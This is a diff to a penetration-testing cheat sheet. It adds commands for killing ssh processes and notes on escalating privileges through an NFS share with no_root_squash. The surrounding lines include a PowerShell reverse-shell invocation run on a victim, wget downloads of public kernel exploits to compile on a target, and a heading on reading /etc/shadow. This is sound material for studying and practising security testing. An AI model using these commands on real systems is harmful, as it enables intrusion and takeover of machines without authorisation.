@@ -842,6 +842,11 @@ powershell -executionpolicy bypass -file Invoke-PowerShellTcp.ps1 #Once on victi
 ````
 https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/pivoting-basics/
 ````
+### Commands
+````
+ps aux | grep ssh
+kill (enter pid #)
+````
 ### Tools
 #### sshuttle
 ##### Linux Enviorment
@@ -971,6 +976,22 @@ wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-403
 ````
 wget https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/memodipper/memodipper.c
 gcc memodipper.c -o memodipper #compile on the target not kali
+````
+### NFS Shares
+#### cat /etc/exports
+````
+Files created via NFS inherit the remote user’s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the “nobody” user.
+
+Notice that the /srv share has root squashing disabled. Because of this, on our local machine we can create a mount point and mount the /srv share.
+
+-bash-4.2$ cat /etc/exports
+/srv/Share 10.1.1.0/24(insecure,rw)
+/srv/Share 127.0.0.1/32(no_root_squash,insecure,rw)
+
+"no_root_squash"
+````
+````
+
 ````
 ### Bad File permissions
 #### cat /etc/shadow
